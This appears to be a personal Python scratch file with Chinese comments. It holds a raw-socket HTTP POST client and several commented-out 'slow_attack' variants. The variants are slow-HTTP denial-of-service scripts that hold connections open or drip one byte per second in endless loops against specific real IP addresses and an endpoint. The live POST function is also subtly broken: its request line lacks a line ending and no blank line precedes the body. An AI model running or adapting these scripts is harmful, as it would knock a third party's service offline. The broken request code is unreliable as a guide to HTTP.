import socket
from urllib.parse import urlencode
def send_post_request(host, port, url, data):
    """
    发送 POST 请求

    :param host: 服务器的 IP 地址或域名
    :param port: 服务器的端口号
    :param url: 请求的 URL
    :param data: 请求的数据
    """

    # 创建套接字
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # 连接到服务器
    sock.connect((host, port))

    # 发送请求的首行
    request_line = "POST {} HTTP/1.1".format(url)
    sock.sendall(request_line.encode("utf-8"))

    # 发送请求头
    headers = {
        "Host": host,
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": str(len(data))
    }
    for header, value in headers.items():
        header = header + ": " + value + "\r\n"
        sock.sendall(header.encode("utf-8"))

    # 发送请求体
    sock.sendall(data.encode("utf-8"))

    # 接收响应
    response = b""
    while True:
        data = sock.recv(1024)
        response += data
        if not data:
            break

    # 关闭套接字
    sock.close()

    return response


if __name__ == "__main__":
    # 服务器的 IP 地址或域名
    host = "39.97.183.165"
    # 服务器的端口号
    port = 8886
    # 请求的 URL
    url = "/qianglong/getyijiansandiao"
    # 请求的数据
    params = {"bkmc": "yd_1_sec_8", "tszb": "蓝粉彩带蓝变粉"}
    encoded_params = urlencode(params)    
    # data = "bkmc=yd_1_sec_8&tszb=%E8%93%9D%E7%B2%89%E5%BD%A9%E5%8F%98%E8%93%9D%E5%8F%98%E7%B2%89"

    # 发送请求
    response = send_post_request(host, port, url, encoded_params)

    # 打印响应
    print(response.decode("utf-8"))
















# import socket
# import time
# import asyncio
# from urllib.parse import urlencode, urlunparse

# async def slow_attack(host, port):
#     params = {"bkmc": "yd_1_sec_8", "tszb": "蓝粉彩带蓝变粉"}
#     encoded_params = urlencode(params)
#     path = "/qianglong/getyijiansandiao?" + encoded_params
#     url = urlunparse(('http', f"{host}:{port}", path, '', '', ''))
#     request = f"POST {url} HTTP/1.1\r\nHost: {host}\r\n\r\n".encode('utf-8')

#     while True:
#         try:
#             # 创建一个TCP套接字
#             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#             sock.connect((host, port))
#             # 发送请求
#             sock.sendall(request)
#             # 接收响应
#             response = sock.recv(4096)  # 读取4096字节的数据
#             print(f"Received: {response.decode('utf-8')}")
#             time.sleep(100)
#         except Exception as e:
#             print(f"Error in slow_attack: {e}")
#             time.sleep(5)  # 等待一段时间后再次尝试连接服务器
#         finally:
#             sock.close()

# asyncio.run(slow_attack("39.97.183.165", 8886))












# 这段代码其实aiohttp在底层实现的时候已经读取了网络的数据。所以这个代码是不行的。
# import aiohttp
# import asyncio
# from urllib.parse import urlencode

# async def send_request(session, url):
#     while True:
#         try:
#             await session.post(url, data="a")
#             await asyncio.sleep(1)
#         except Exception as e:
#             print(f"Error in send_request: {e}")
#             await asyncio.sleep(5)  # 等待一段时间后再次尝试发送请求

# async def receive_response(session, url):
#     while True:
#         try:
#             async with session.get(url) as resp:
#                 pass
#             await asyncio.sleep(100)
#         except Exception as e:
#             print(f"Error in receive_response: {e}")
#             await asyncio.sleep(5)  # 等待一段时间后再次尝试接收响应

# async def slow_attack(host, port):
#     params = {"bkmc": "yd_1_sec_8", "tszb": "蓝粉彩带蓝变粉"}
#     encoded_params = urlencode(params)
#     path = "/qianglong/getyijiansandiao?" + encoded_params    
#     url = f"http://{host}:{port}{path}"
#     while True:
#         try:
#             async with aiohttp.ClientSession() as session:
#                 send_coro = send_request(session, url)
#                 receive_coro = receive_response(session, url)
#                 await asyncio.gather(send_coro, receive_coro)
#         except Exception as e:
#             print(f"Error in slow_attack: {e}")
#             await asyncio.sleep(5)  # 等待一段时间后再次尝试连接服务器

# asyncio.run(slow_attack("39.97.183.165", 8886))







# import aiohttp
# import asyncio
# import time
# from urllib.parse import urlencode

# async def send_request(session, url):
#     while True:
#         # for i in range(100):
#         await session.post(url,data= "a")
#         await asyncio.sleep(1)

# async def receive_response(session, url):
#     async with session.get(url) as resp:
#         while True:
#             # chunk = await resp.content.read(1)
#             # if not chunk:
#             #     break
#             # print(chunk.decode("utf-8"))
#             await asyncio.sleep(100)

# async def slow_attack(host, port):
#     params = {"bkmc": "yd_1_sec_8", "tszb": "蓝粉彩带蓝变粉"}
#     encoded_params = urlencode(params)
#     path = "/qianglong/getyijiansandiao?" + encoded_params    
#     url = f"http://{host}:{port}{path}"
#     async with aiohttp.ClientSession() as session:
#         send_coro = send_request(session, url)
#         receive_coro = receive_response(session, url)
#         await asyncio.gather(send_coro, receive_coro)

# asyncio.run(slow_attack("39.97.183.165", 8886))








# import http.client
# import time
# from urllib.parse import urlencode


# def slow_attack(host, port, path):
#     while True:  # 无限循环
#         try:
#             conn = http.client.HTTPConnection(host, port)
#             headers = {"Content-Length": "100"}  # 声明我们将要发送的内容长度
#             conn.putrequest("POST", path)
#             for header, value in headers.items():
#                 conn.putheader(header, value)
#             conn.endheaders()

#             # 每秒发送一个字节
#             for i in range(100):
#                 conn.send(b"a")
#                 time.sleep(1)  # 暂停一秒
                
#             res = conn.getresponse()
#             data = res.read()
#             print(data.decode("utf-8"))       
#             # break         

#         except ConnectionResetError:
#             print("Connection reset by peer")
#         except KeyboardInterrupt:
#             print("Interrupted by user")
#             break  # 如果用户按下Ctrl+C，跳出无限循环
#         except Exception as e:
#             print(f"Unexpected error: {e}")
#         finally:
#             # 关闭连接
#             conn.close()

# # slow_attack("8.131.101.60", 8888, "/")
# # http://39.97.183.165:8886/qianglong/getyijiansandiao?bkmc=yd_1_sec_8&tszb=蓝粉彩带蓝变粉
# params = {"bkmc": "yd_1_sec_8", "tszb": "蓝粉彩带蓝变粉"}
# encoded_params = urlencode(params)
# path = "/qianglong/getyijiansandiao?" + encoded_params

# slow_attack("39.97.183.165", 8886, path)
